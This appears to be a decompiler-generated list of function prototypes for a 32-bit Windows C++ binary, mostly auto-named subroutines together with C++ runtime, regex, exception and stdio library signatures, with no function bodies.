void __thiscall sub_4797E9(volatile signed __int32 *this);
void __thiscall sub_479823(int this, int a2);
char __thiscall sub_47991E(volatile signed __int32 *this, int a2);
char __cdecl sub_479958(int a1, int a2);
bool __thiscall sub_479971(_DWORD *this, char a2);
_DWORD *__thiscall sub_4799C5(_DWORD *this, int a2);
void __thiscall sub_479A01(_DWORD *this, int a2);
unsigned int *__cdecl sub_479A46(unsigned int *a1, unsigned int a2, char a3);
_DWORD *__thiscall sub_479A64(_DWORD *this, const void **a2);
char *__thiscall sub_479A8A(char *this, int a2);
char *__thiscall sub_479AA5(char *this, int a2);
char *__thiscall sub_479AC0(char *this, int a2);
void __thiscall sub_479ADB(void **this);
void **__thiscall sub_479AE7(void **this, const void **a2);
int __thiscall sub_479B05(_DWORD *this, unsigned int a2);
bool __cdecl sub_479B3B(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_479B59(unsigned int *this, unsigned int a2, int *a3);
unsigned int __thiscall sub_479C45(unsigned int *this);
char *__cdecl sub_479C8E(unsigned int a1);
bool __cdecl sub_479CA5(int a1, int a2);
int __thiscall sub_479D85(int *this);
_DWORD *__thiscall sub_479DBF(_DWORD *this, int a2, _DWORD *a3, int a4);
_DWORD *__thiscall sub_479E1D(_DWORD *this, int a2, _DWORD *a3);
int __thiscall sub_479E6B(_DWORD *this);
void __thiscall sub_479E7D(DWORD_PTR *this);
int __thiscall sub_479EE5(_DWORD *this);
int __thiscall sub_479EE9(_DWORD *this);
int __thiscall sub_479EED(int this);
void __thiscall sub_479FB5(DWORD_PTR *this, int a2);
BOOL __thiscall sub_47A014(int this);
BOOL __thiscall sub_47A030(_DWORD *this);
int __cdecl sub_47A053(int a1);
double __cdecl sub_47A06B(double a1);
int __thiscall sub_47A0A3(int this, int a2, unsigned int a3, int a4);
int __thiscall sub_47A130(double *this, double a2, int a3);
double __stdcall sub_47A153(unsigned int a1, unsigned int a2, int a3, int a4);
double __thiscall sub_47A18E(char *this, int a2, int a3);
double __thiscall sub_47A249(int this);
unsigned int __thiscall sub_47A280(int this, int a2);
unsigned int __thiscall sub_47A2C5(unsigned int *this);
char *__thiscall sub_47A30B(char *this, int a2);
BOOL __thiscall sub_47A336(_BYTE *this);
bool __stdcall sub_47A34F(int a1);
double __thiscall sub_47A37F(double *this);
unsigned int __thiscall sub_47A39F(int this, unsigned int a2);
unsigned int __thiscall sub_47A46F(int this, unsigned int a2, unsigned int a3, int a4, unsigned int a5);
double __thiscall sub_47A62F(double *this);
char *__thiscall sub_47A67B(char *this, int a2, int a3, _DWORD *a4);
void __thiscall sub_47A8D7(char *this);
void __thiscall sub_47A934(_DWORD *this, int a2, int a3, char a4);
void __thiscall sub_47A9FF(int this, int a2);
int __thiscall sub_47AA4D(_DWORD *this, int a2);
int __thiscall sub_47AA86(_DWORD *this, int a2);
void __thiscall sub_47AA95(int this, int a2, unsigned int a3);
unsigned int __thiscall sub_47AB43(_DWORD *this, unsigned int a2);
int __thiscall sub_47ABB3(void *this, int a2);
void __thiscall sub_47AC0F(_DWORD *this);
_DWORD *__thiscall sub_47ACDC(void *this, _DWORD *a2, int a3);
int __thiscall sub_47AD23(char *this, int a2);
_DWORD *__thiscall sub_47ADDF(void *this, _DWORD *a2, int a3);
unsigned int __thiscall sub_47AE17(_DWORD *this, int a2);
char __thiscall sub_47AE61(_DWORD *this, int a2, int a3, char a4);
void __thiscall sub_47AEDA(char *this);
void __thiscall sub_47AEF5(int this, _DWORD *a2);
int __thiscall sub_47AF7A(int this, int a2);
int __thiscall sub_47B004(_DWORD *this);
LPVOID __thiscall sub_47B021(_DWORD *this);
_DWORD *__thiscall sub_47B03E(_DWORD *this, int a2);
_DWORD *__thiscall sub_47B08E(void *this, _DWORD *a2);
_DWORD *__thiscall sub_47B0DC(int this, unsigned int a2, int a3, char a4);
unsigned __int32 __thiscall sub_47B3B5(_DWORD *this, int a2);
char __thiscall sub_47B403(_DWORD *this, int a2, int a3, char a4);
_DWORD *__thiscall sub_47B489(_DWORD *this);
int __thiscall sub_47B532(_DWORD *this, int a2);
void __thiscall sub_47B568(_DWORD *this, int a2, int a3);
void __thiscall sub_47B652(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_47B67E(_DWORD *this, char a2);
void __thiscall sub_47B691(int this, int a2, char a3);
int __thiscall sub_47B775(_DWORD *this);
_DWORD *__thiscall sub_47B77F(_DWORD *this);
char __thiscall sub_47B789(_DWORD *this, int a2, int a3);
int __stdcall sub_47B7C5(int a1);
__int32 sub_47B80E();
int __cdecl sub_47B8BB(int a1);
int sub_47B8DD();
union _SLIST_HEADER *__thiscall sub_47B8F8(union _SLIST_HEADER *this, int a2);
_DWORD *__thiscall sub_47B931(_DWORD *this, int a2, int a3);
int __thiscall sub_47B966(int this, int a2);
char *__thiscall sub_47B990(char *this);
void __thiscall sub_47B9C4(_DWORD *this);
_DWORD *__thiscall sub_47BA3B(_DWORD *this, char a2);
_DWORD *__thiscall sub_47BA5E(_DWORD *this, char a2);
_DWORD *__thiscall sub_47BA86(_DWORD *this, char a2);
_DWORD *__thiscall sub_47BAA9(_DWORD *this, char a2);
_DWORD *__thiscall sub_47BACC(void *this, int a2);
int __cdecl sub_47BB01(int a1);
int __thiscall sub_47BB29(_DWORD *this);
int __thiscall sub_47BB2D(char *this);
BOOL __stdcall sub_47BB75(_DWORD *a1, int a2);
PSLIST_ENTRY __thiscall sub_47BB8D(char *this, struct _SINGLE_LIST_ENTRY *a2);
void __thiscall sub_47BBF0(_BYTE *this, struct _SINGLE_LIST_ENTRY *a2);
signed __int32 __thiscall sub_47BC95(volatile signed __int32 *this);
signed __int32 __thiscall sub_47BC9F(volatile signed __int32 *this);
int __thiscall sub_47BCCC(union _SLIST_HEADER *this, unsigned int a2, int a3);
BOOL __stdcall sub_47BD4E(_DWORD *a1);
PSLIST_ENTRY __thiscall sub_47BD5D(union _SLIST_HEADER *this);
int __thiscall sub_47BDC9(int this);
void sub_47BDEA();
int *__thiscall sub_47BE06(int *this);
DWORD __stdcall sub_47BF00(int a1, int a2, int a3, int a4);
int __thiscall sub_47BFC6(_DWORD *this, int a2, int a3);
char __thiscall sub_47C003(_DWORD *this, int a2, int a3);
int __thiscall sub_47C040(_DWORD *this, int a2);
int __thiscall sub_47C07D(void **this, int a2, int a3, int a4, int a5, int a6);
int __thiscall sub_47C0C1(_DWORD *this, int a2, int a3, int a4);
int __thiscall sub_47C0FA(_DWORD *this, int a2, int a3);
__int32 sub_47C130();
void sub_47C19F();
int __cdecl sub_47C1E2(int (__thiscall ***a1)(_DWORD, int));
_DWORD *__thiscall sub_47C204(_DWORD *this, int a2);
// int unknown_libname_33(); weak
_DWORD *__thiscall sub_47C27C(_DWORD *this);
void __thiscall sub_47C2DC(void *this);
void *__thiscall sub_47C33C(void *this, char a2);
bool __thiscall sub_47C361(_DWORD *this, unsigned int a2);
int __thiscall sub_47C396(_DWORD *this, int a2);
bool __thiscall sub_47C3DF(int this);
char __cdecl sub_47C423(int a1);
char __thiscall sub_47C42F(__int32 this, __int32 *a2, int a3, char a4);
signed __int32 __thiscall sub_47C4C4(_DWORD *this, int a2);
int __thiscall sub_47C4E9(_DWORD **this, int a2);
int __stdcall sub_47C50B(_DWORD *a1);
int __thiscall sub_47C52C(_DWORD **this, int a2);
char __thiscall sub_47C54E(_DWORD **this, __int32 a2, int a3, struct _SINGLE_LIST_ENTRY *a4);
char __thiscall sub_47C5DF(int this, struct _SINGLE_LIST_ENTRY *a2);
PSLIST_ENTRY __thiscall sub_47C60A(_DWORD *this);
int __thiscall sub_47C620(unsigned int *this, int a2);
int __thiscall sub_47C63E(int this, int a2, int a3);
signed __int32 __thiscall sub_47C7BC(_DWORD *this, unsigned int a2);
signed __int32 __thiscall sub_47C7FC(_DWORD *this, unsigned int a2);
int __thiscall sub_47C840(int this, __int32 a2, char a3);
char __thiscall sub_47C8B0(_BYTE *this);
signed __int32 __thiscall sub_47C91A(int this);
int __thiscall sub_47C94D(_DWORD *this);
char __thiscall sub_47C99B(PSLIST_HEADER ListHead, signed __int32 a2, int a3, char a4);
char __thiscall sub_47CA8F(int **this);
char __thiscall sub_47CBF1(int this);
volatile signed __int32 *__thiscall sub_47CC03(volatile signed __int32 *this, _DWORD *a2);
int __thiscall sub_47CC3D(_DWORD *this, unsigned int a2);
int __thiscall sub_47CC85(_DWORD *this, unsigned int a2);
char __thiscall sub_47CCCD(void *this, _DWORD *a2, int a3);
int __cdecl sub_47CD6B(char a1, char a2, int a3, int a4);
int __stdcall sub_47CDE6(char a1, unsigned __int8 a2, int a3, int a4);
char __thiscall sub_47CE13(int this, char a2, char a3);
int __thiscall sub_47CE71(_DWORD *this);
char *__thiscall sub_47CE8E(char *this, int a2, int a3, int *a4);
void __thiscall sub_47CF0B(PSLIST_HEADER ListHead);
void __thiscall sub_47CF82(int this);
int __thiscall sub_47CFAB(int this, signed __int32 a2);
signed __int32 __thiscall sub_47D10D(volatile signed __int32 **this, int a2, char a3);
char __thiscall sub_47D215(_DWORD *this);
int __thiscall sub_47D269(_DWORD *this, int a2);
int __thiscall sub_47D2A6(_DWORD *this, _DWORD *a2);
char __thiscall sub_47D300(_DWORD *this, __int32 *a2, int a3, int a4, int a5, int a6, int a7);
int *__thiscall sub_47D370(int *this, int *a2);
__int32 __thiscall sub_47D3A4(int *this, char a2);
__int32 __thiscall sub_47D3E7(int *this, char a2);
_DWORD *__thiscall sub_47D465(_DWORD *this);
void __thiscall sub_47D47A(_DWORD *this);
int *__thiscall sub_47D4CC(_DWORD *this);
int *__thiscall sub_47D4E5(_DWORD *this, int a2);
char __thiscall sub_47D535(int *this, _DWORD *a2);
void __thiscall sub_47D55F(int *this, int a2);
int __cdecl sub_47D596(int a1);
int *__cdecl sub_47D5E7(int a1);
_DWORD *__thiscall sub_47D620(_DWORD *this, int a2);
char *__thiscall sub_47D697(char *this, int a2);
char *__thiscall sub_47D6B2(char *this, int a2);
char *__thiscall sub_47D6CD(char *this, int a2);
char *__thiscall sub_47D6E8(char *this, int a2);
void __thiscall sub_47D703(_DWORD *this);
int sub_47D74F();
char *__thiscall sub_47D785(_DWORD *this, char a2);
int __thiscall sub_47D7B2(_DWORD *this, int a2, int a3, int a4, int a5);
int *__thiscall sub_47D930(_DWORD **this, int a2);
int __thiscall sub_47D984(int this);
char __thiscall sub_47DAC0(int this);
void __thiscall sub_47DB32(_DWORD *this);
int __thiscall sub_47DB4A(_DWORD *this);
BOOL __thiscall sub_47DB65(int this, int a2);
char __thiscall sub_47DCF3(int *this, _DWORD *a2);
char __thiscall sub_47DD30(int this);
int __thiscall sub_47DD9E(_DWORD *this, bool *a2, bool *a3);
int __thiscall sub_47DEC8(_DWORD **this, int a2);
signed __int32 __thiscall sub_47DEF4(volatile signed __int32 *this, signed __int32 a2);
int __thiscall sub_47DF22(_DWORD *this);
int __thiscall sub_47DF2A(_DWORD *this);
int __thiscall sub_47DF31(_DWORD **this);
int __thiscall sub_47DF4A(_DWORD *this);
void __thiscall sub_47DF79(int *this, int a2, int a3, int a4);
bool __thiscall sub_47E0F1(_DWORD *this);
char __thiscall sub_47E0F9(int this);
int __thiscall sub_47E157(int this);
char __thiscall sub_47E25C(int this, char a2);
int __thiscall sub_47E2E2(int this, int a2, int a3, char a4);
int __thiscall sub_47E335(int this, int a2);
void __thiscall sub_47E34C(int *this, int a2);
void __thiscall sub_47E38D(_DWORD *this);
int __thiscall sub_47E3F6(void *this);
void __thiscall sub_47E415(int this);
int __thiscall sub_47E438(int (__thiscall **this)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int a2, int a3, int a4);
int __thiscall sub_47E460(_DWORD *this, int a2);
char __thiscall sub_47E493(_DWORD *this);
char __cdecl sub_47E4BE(_DWORD *a1, int a2);
int __thiscall sub_47E4EB(int this);
void __thiscall sub_47E5A6(_DWORD *this, int a2, char a3);
char __thiscall sub_47E5F1(int this, int a2);
int __thiscall sub_47E710(struct _SINGLE_LIST_ENTRY *this, int a2, int a3);
int __fastcall sub_47E855(int a1);
int __thiscall sub_47E914(_DWORD *this);
char __thiscall sub_47EA14(int this, int a2);
int __thiscall sub_47EA70(int this);
union _SLIST_HEADER *__thiscall sub_47EBF4(union _SLIST_HEADER *this, int a2, struct _SINGLE_LIST_ENTRY *a3);
void __thiscall sub_47EC7D(PSLIST_HEADER ListHead);
void __thiscall sub_47ECF4(union _SLIST_HEADER *this);
volatile __int32 *__thiscall sub_47ED0C(volatile __int32 *this);
char __cdecl sub_47ED3E(int a1);
int __stdcall sub_47ED4A(_DWORD *a1);
char __thiscall sub_47ED6B(PSLIST_HEADER ListHead, signed __int32 a2, int a3, char a4);
char __thiscall sub_47EE5F(char *this, signed __int32 a2);
int *__thiscall sub_47EE8E(int *this, int a2, int a3, char a4, unsigned int a5);
int __thiscall sub_47EF05(int this, int a2, _DWORD *a3);
_DWORD *__thiscall sub_47EF5E(_DWORD *this, int a2, int a3, _DWORD *a4);
_DWORD *__thiscall sub_47F01F(_DWORD *this, int a2, int a3, unsigned int a4, int a5);
void __thiscall sub_47F08B(PSLIST_HEADER ListHead);
void __thiscall sub_47F105(PSLIST_HEADER ListHead);
void __thiscall sub_47F181(int this);
void __thiscall sub_47F1E5(signed __int32 this);
void **__thiscall sub_47F233(void **this, void **a2);
void *__thiscall sub_47F25D(void *this, char a2);
int __thiscall sub_47F282(int this, int *a2);
int __thiscall sub_47F3E3(int this, signed __int32 a2);
int __thiscall sub_47F548(_DWORD *this, int a2, int a3, int a4, int a5, int a6);
char __cdecl sub_47F650(int a1);
signed __int32 __thiscall sub_47F65C(_DWORD *this, int a2, signed __int32 a3);
int __thiscall sub_47F681(char *this, _DWORD *a2, int a3);
void __stdcall sub_47F732(_DWORD *a1);
void __thiscall sub_47F753(_DWORD *this);
char __thiscall sub_47F7C9(volatile signed __int32 *this, _DWORD *a2);
int __thiscall sub_47F88B(int *this);
int __thiscall sub_47F8BF(_DWORD *this, int a2);
int __thiscall sub_47F8FE(int this, int a2);
_DWORD *__thiscall sub_47F939(char *this, _DWORD *a2, int a3);
int __thiscall sub_47F98D(union _SLIST_HEADER *this);
int __thiscall sub_47F9F2(_DWORD *this, int a2, char a3);
int __thiscall sub_47FA25(int *this);
_DWORD *__thiscall sub_47FA35(int *this, int a2);
bool __thiscall sub_47FA7F(_DWORD *this);
bool __thiscall sub_47FA87(void *this);
int __thiscall sub_47FA92(_DWORD *this, int a2);
int __thiscall sub_47FABB(int *this, _DWORD *a2);
int __thiscall sub_47FACE(int this, int a2, int a3, _DWORD *a4);
bool __thiscall sub_47FB50(_DWORD *this);
_DWORD *__thiscall sub_47FB65(int *this, unsigned int a2, char a3);
int __thiscall sub_47FBAD(int this, int *a2, char a3);
int *__thiscall sub_47FC89(int this);
int __thiscall sub_47FCE2(int this);
int __thiscall sub_47FD15(void *this, int a2);
PSLIST_ENTRY __thiscall sub_47FD2E(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2);
char __thiscall sub_47FD54(PSLIST_HEADER ListHead, signed __int32 a2, int a3, char a4);
char __thiscall sub_47FE45(signed __int32 this);
char __thiscall sub_47FE68(_DWORD *this);
signed __int32 __thiscall sub_47FEA7(union _SLIST_HEADER *this, signed __int32 a2);
char __thiscall sub_47FECE(union _SLIST_HEADER *this, int *a2);
int __thiscall sub_47FF10(void *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3, int a4);
int __thiscall sub_47FF40(void *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3);
int __thiscall sub_47FF68(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3);
int __thiscall sub_48009C(int this, unsigned int a2);
_BYTE *__thiscall sub_4800C2(int this, char a2);
_DWORD *__thiscall sub_48026D(int *this, _DWORD *a2, int a3);
int __thiscall sub_4802B9(void *this, int a2);
_DWORD *__thiscall sub_4802C8(int this, _DWORD *a2, int a3);
int __thiscall sub_480317(int this, int a2);
volatile signed __int32 *__thiscall sub_480355(_DWORD *this, int a2);
_DWORD *__thiscall sub_48038D(void *this, _DWORD *a2, int a3, int a4, _DWORD *a5);
_DWORD *__thiscall sub_4803C5(void *this, _DWORD *a2, int a3);
int __thiscall sub_4803DD(int *this);
void __thiscall sub_480410(_DWORD *this, int *a2);
signed __int32 __thiscall sub_48044E(_DWORD *this, int a2, signed __int32 a3);
_DWORD *__thiscall sub_480474(int this, int a2, int a3);
int __thiscall sub_4804A3(int this, int a2, char a3);
_DWORD *__thiscall sub_48050C(_DWORD *this, int a2, char a3);
void __thiscall sub_4805A5(_DWORD *this);
_DWORD *__thiscall sub_4805EA(_DWORD *this, char a2);
int *__thiscall sub_48060F(_DWORD *this, int a2);
DWORD __thiscall sub_480630(int this);
int __thiscall sub_48067A(int this);
void __thiscall sub_4806D2(_DWORD *this, int a2);
PSLIST_ENTRY __thiscall sub_4806F7(_DWORD *this);
HMODULE __stdcall sub_480714(int a1, int a2, int a3, int a4);
int __stdcall sub_480736(int a1, int a2);
bool __thiscall sub_480759(_DWORD *this);
int __thiscall sub_480761(_DWORD *this, char a2);
DWORD __thiscall sub_480796(int this, char a2);
int __thiscall sub_480859(int this);
int __thiscall sub_48087B(void *this);
signed __int32 __thiscall sub_480893(int this);
BOOL __thiscall sub_480914(int this);
_DWORD *__thiscall sub_480944(_DWORD *this, int a2);
HANDLE *__thiscall sub_48096A(HANDLE *this, const void **a2);
void __thiscall sub_48099B(char *this);
_DWORD *__thiscall sub_4809AF(_DWORD *this, char a2);
char *__thiscall sub_4809F1(char *this, char a2);
unsigned int __thiscall sub_480A16(void *this, int a2, unsigned int a3);
HANDLE *__cdecl sub_480A22(const void **a1);
_DWORD *__fastcall sub_480A55(int a1);
_DWORD *__stdcall sub_480A93(int a1, int a2);
char *__thiscall sub_480ACB(char *this);
int __thiscall sub_480ACF(_DWORD *this);
_DWORD *__thiscall sub_480AE8(const void **this, _DWORD *a2);
_DWORD *__thiscall sub_480AFD(const void **this, _DWORD *a2);
int __thiscall sub_480B05(_DWORD *this, int a2, unsigned int a3);
union _SLIST_HEADER *__thiscall sub_480B11(union _SLIST_HEADER *this, _DWORD *a2, _DWORD *a3, union _SLIST_HEADER *a4);
DWORD sub_480B1D();
BOOL sub_480B5F();
// _DWORD __thiscall std::exception_ptr::exception_ptr(std::exception_ptr *__hidden this, const struct std::exception_ptr *); weak
void *__cdecl sub_480BB5(void *a1);
signed __int32 __thiscall sub_480C01(volatile signed __int32 *this, int a2);
int __thiscall sub_480C27(_DWORD *this, unsigned int *a2);
char __thiscall sub_480C4F(volatile signed __int32 *this);
signed __int32 __thiscall sub_480C77(volatile signed __int32 *this);
void __thiscall sub_480CD5(_DWORD *this);
// void __noreturn std::rethrow_exception(void); weak
_DWORD *__thiscall sub_480D65(_DWORD *this, int a2);
_DWORD *__thiscall sub_480DCC(_DWORD *this);
int __thiscall sub_480E16(int this, int a2);
int __thiscall sub_480E3A(volatile __int32 *this);
int __thiscall sub_480E74(int this, int a2);
int __cdecl sub_480E98(int a1);
signed __int32 __cdecl sub_480EA9(signed __int32 a1);
__int32 __thiscall sub_480EBA(volatile __int32 *this, char a2);
int __thiscall sub_480EFD(volatile __int32 *this, unsigned __int8 (__cdecl *a2)(int, int), int a3, int (__cdecl *a4)(int, int));
int __thiscall sub_480FB1(volatile __int32 *this, unsigned __int8 (__cdecl *a2)(int, int), int a3, int (__cdecl *a4)(int, int));
__int32 __thiscall sub_480FBD(volatile __int32 *this, char a2, _BYTE *a3);
__int32 __thiscall sub_48102D(int this, char a2, int a3);
__int32 __thiscall sub_4810BB(int this, char a2);
void __cdecl sub_481177(int a1);
int __cdecl sub_48119E(int (__thiscall ***a1)(_DWORD, int));
void __thiscall sub_4811BC(_DWORD *this, int a2);
void __thiscall sub_4811D4(_DWORD *this, int a2);
void __thiscall sub_48120A(int this, int a2);
char __thiscall sub_481272(_BYTE *this, char a2);
signed __int32 __cdecl sub_48127F(int a1);
_DWORD *__thiscall sub_4813E7(_DWORD *this, int a2, _DWORD *a3, int a4);
_DWORD *__thiscall sub_481431(_DWORD *this, char a2);
int __thiscall sub_48145B(_DWORD *this);
int __thiscall sub_481463(_DWORD *this);
int __thiscall sub_481467(_DWORD *this);
int __thiscall sub_48146B(int *this, int a2);
unsigned int __thiscall sub_4814C3(int this);
unsigned __int32 __thiscall sub_4814D9(_DWORD **this);
unsigned int __thiscall sub_4814E6(_DWORD **this);
_DWORD *__thiscall sub_4814F3(_DWORD *this, int a2, _DWORD *a3, int a4);
bool __thiscall sub_481526(_WORD *this, int a2);
_DWORD *__thiscall sub_481546(_DWORD *this, char a2);
int __thiscall sub_481570(_DWORD *this);
int __thiscall sub_48159F(int this, __int32 a2);
int __thiscall sub_481661(int (__thiscall ***this)(void *), int (__thiscall **a2)(void *));
char __thiscall sub_4816C8(int this, int a2);
int __thiscall sub_48176B(_DWORD *this);
_BYTE *__thiscall sub_4817B9(_DWORD *this, int a2);
__int32 __thiscall sub_481839(int this, int a2);
int __thiscall sub_4818A6(int this, int a2, __int16 a3, int a4);
char __thiscall sub_4818DC(_DWORD *this);
int __thiscall sub_48190A(_DWORD *this, int a2);
void __fastcall sub_48192D(int a1);
int __thiscall sub_4819D3(int this);
__int32 __thiscall sub_4819F1(_DWORD *this, int a2);
__int32 __thiscall sub_481A42(volatile __int32 *this, int a2, int a3);
int __thiscall sub_481B06(_DWORD *this, int a2, int a3);
std::regex_error *__thiscall sub_481BD9(std::regex_error *this, const struct std::regex_error *a2);
int __thiscall sub_481BF4(void *this);
void *__thiscall sub_481C55(void *this, char a2);
BOOL __thiscall sub_481C77(_DWORD *this);
int __thiscall sub_481C88(_DWORD *this);
BOOL __thiscall sub_481C8C(HANDLE *this);
BOOL __thiscall sub_481C96(_DWORD *this, int a2);
char __thiscall sub_481CAE(_DWORD *this);
__int32 __thiscall sub_481CD9(int this);
int __stdcall sub_481CF5(int a1);
int *__thiscall sub_481D45(int *this, int a2, int a3, int a4, int a5);
bool __thiscall sub_481D6A(unsigned int *this, int a2);
char __thiscall sub_481D94(int this, _DWORD *a2);
bool __thiscall sub_481DDF(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_481E2B(_DWORD *this, int a2);
unsigned __int32 __thiscall sub_481E51(_DWORD *this, int a2);
int __thiscall sub_481EA2(int *this);
int __thiscall sub_481EEF(_DWORD *this, int a2);
char __thiscall sub_481F29(_QWORD *this, __int64 a2);
char __thiscall sub_481F5F(_DWORD *this, _DWORD *a2, int *a3, char a4);
int __thiscall sub_481FF6(_DWORD *this, int *a2, int a3);
int __thiscall sub_482043(_DWORD *this, _DWORD *a2);
int __thiscall sub_48207E(_DWORD *this, _DWORD *a2);
char __stdcall sub_4820BC(int *a1, int *a2, char a3);
char __thiscall sub_48210C(_DWORD *this, int *a2, int *a3, char a4, int a5, char a6);
char __stdcall sub_48218D(_DWORD *a1, int a2);
char __thiscall sub_4821CA(_DWORD *this, _DWORD *a2, int a3, int a4, char a5);
char __stdcall sub_482245(int *a1, int a2, char a3, char a4);
char __thiscall sub_482298(_DWORD *this, int *a2, int a3, char a4, int a5, char a6);
PSLIST_ENTRY __thiscall sub_482326(_DWORD *this);
void __thiscall sub_482369(int this, signed __int64 a2);
char __thiscall sub_4823A2(_DWORD *this, _DWORD *a2);
bool __stdcall sub_4823DE(int *a1, int *a2, char a3, char a4);
bool __stdcall sub_48244B(int *a1, int *a2, char a3, char a4);
__int64 __thiscall sub_4824B9(_DWORD *this, int a2, int a3);
bool __thiscall sub_482513(void *this);
char __thiscall sub_482592(int this, int *a2, int *a3, char a4, char a5);
char __thiscall sub_482859(int this, int *a2, int *a3, char a4, char a5);
char __thiscall sub_482AE1(int this, int *a2, _DWORD *a3, int *a4, char a5, int a6, char a7, char a8);
char __thiscall sub_482BDD(int this, int *a2, _DWORD *a3, int a4, char a5, int a6, char a7, char a8);
char __thiscall sub_482CEB(int this, int *a2, _DWORD *a3, int a4, char a5, int a6, char a7, char a8);
char __thiscall sub_482DEA(int this, int *a2, int a3, int a4, unsigned int a5);
char __thiscall sub_482EFD(int this, int *a2, int a3, int a4, unsigned int a5);
char __stdcall sub_48300B(int *a1, _DWORD *a2, char a3);
char __stdcall sub_48309F(_DWORD *a1, _DWORD *a2);
char __stdcall sub_483120(int *a1, _DWORD *a2, char a3);
unsigned int __thiscall sub_4831B8(_DWORD *this, int a2, unsigned int a3);
unsigned int __thiscall sub_4831DE(_DWORD *this, int a2, unsigned int a3);
bool __thiscall sub_483204(_DWORD *this, int a2, int a3, int a4, char a5);
char __thiscall sub_483290(_DWORD **this, _DWORD *a2, _DWORD *a3);
char __thiscall sub_4832D2(int this, _DWORD *a2, _DWORD *a3, int *a4);
__int32 __thiscall sub_483341(int *this);
void __thiscall sub_483358(_DWORD *this, _DWORD *a2);
int __thiscall sub_4833A3(int this);
_DWORD *__thiscall sub_4833B7(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_4833EE(_DWORD *this, char a2);
// _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD); weak
// _DWORD __cdecl __std_exception_destroy(_DWORD); weak
void *__cdecl sub_483846(size_t Size);
// _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD); weak
// _DWORD __cdecl __std_type_info_name(_DWORD, PSLIST_HEADER ListHead); weak
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// void *__cdecl memmove(void *, const void *Src, size_t Size);
// void *__cdecl memmove_0(void *, const void *Src, size_t Size);
// void *__cdecl memchr(const void *Buf, int Val, size_t MaxCount);
// void *__cdecl memset(void *, int Val, size_t Size);
char *__thiscall sub_48484A(char *this, int a2);
char *__thiscall sub_484865(char *this, int a2);
_DWORD *__cdecl sub_484C24(_DWORD *a1, int a2);
_DWORD *__cdecl sub_484C40(_DWORD *a1, int a2);
// _DWORD __cdecl __RTDynamicCast(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __uncaught_exception(void); weak
// __vcrt_bool __cdecl __vcrt_uninitialize(__vcrt_bool Terminating);
char *__thiscall sub_4868BF(char *this, int a2);
_DWORD *__thiscall sub_4868DA(_DWORD *this);
// _DWORD __stdcall unknown_libname_34(char); weak
int __cdecl sub_4871B4(int a1, char a2, int a3);
// _DWORD __stdcall DName::operator+(_DWORD, _DWORD); weak
char __thiscall sub_489DB5(_BYTE *this);
int __cdecl sub_48CC98(int a1);
// intptr_t __cdecl _loaddll(char *FileName);
// void __cdecl __noreturn abort();
// int __cdecl fputc(int Character, FILE *Stream);
// void *__cdecl calloc(size_t Count, size_t Size);
// _DWORD __cdecl set_terminate(_DWORD); weak
// void __thiscall __noreturn terminate(_DWORD); weak
// FILE *__cdecl __acrt_iob_func(unsigned int Ix);
// errno_t __cdecl _get_stream_buffer_pointers(FILE *Stream, char ***Base, char ***Pointer, int **Count);
// void __cdecl _lock_file(FILE *Stream);
// void __cdecl _unlock_file(FILE *Stream);
int sub_48D13F();
// _DWORD __cdecl common_flush_all(_DWORD); weak
// int __cdecl fflush(FILE *Stream);
// int __cdecl _wremove(const wchar_t *FileName);
// int __cdecl fclose(FILE *Stream);
// wint_t __cdecl fputwc(wchar_t Character, FILE *Stream);
// int __cdecl remove(const char *FileName);
// wint_t __cdecl ungetwc(wint_t Character, FILE *Stream);
// size_t __cdecl strcspn(const char *Str, const char *Control);
int __cdecl sub_48D8A6(int a1, int a2, int a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7);
// _DWORD __stdcall unknown_libname_41(_DWORD, _DWORD, char); weak
// _DWORD __stdcall unknown_libname_42(_DWORD, _DWORD, _DWORD, char); weak
// _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall unknown_libname_44(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct __crt_locale_pointers *const); weak
// void __thiscall __crt_stdio_output::formatting_buffer::~formatting_buffer(__crt_stdio_output::formatting_buffer *__hidden this); weak
// _DWORD __stdcall unknown_libname_46(char, _DWORD); weak
// _DWORD __stdcall unknown_libname_47(_DWORD); weak
int __thiscall sub_48DF7C(int this);
// int __thiscall unknown_libname_48(_DWORD); weak
char __thiscall sub_48E0E1(char *this);
char __thiscall sub_48E100(char *this);
// _DWORD __stdcall unknown_libname_49(_DWORD); weak
char __thiscall sub_48E18B(int this);
char __thiscall sub_48E1B3(_BYTE *this);
char __thiscall sub_48E31C(int this);
char __thiscall sub_48E54B(int this);
// int __cdecl __crt_stdio_output::to_integer_size(_DWORD); weak
// int __thiscall unknown_libname_50(_DWORD); weak
// int __thiscall unknown_libname_51(_DWORD); weak
// _DWORD __stdcall unknown_libname_52(_DWORD); weak
char __thiscall sub_48E81F(_DWORD *this, int a2, char a3);
// int __thiscall unknown_libname_53(_DWORD); weak
char __thiscall sub_48E9DD(_DWORD *this);
char __thiscall sub_48E9FC(_DWORD *this);
// int __thiscall unknown_libname_54(_DWORD); weak
// int __thiscall unknown_libname_55(_DWORD); weak
// int __thiscall unknown_libname_56(_DWORD); weak
// _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_character(char, _DWORD); weak
// _DWORD __stdcall unknown_libname_57(_DWORD); weak
// _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_string(void *Src, _DWORD, _DWORD, _DWORD); weak
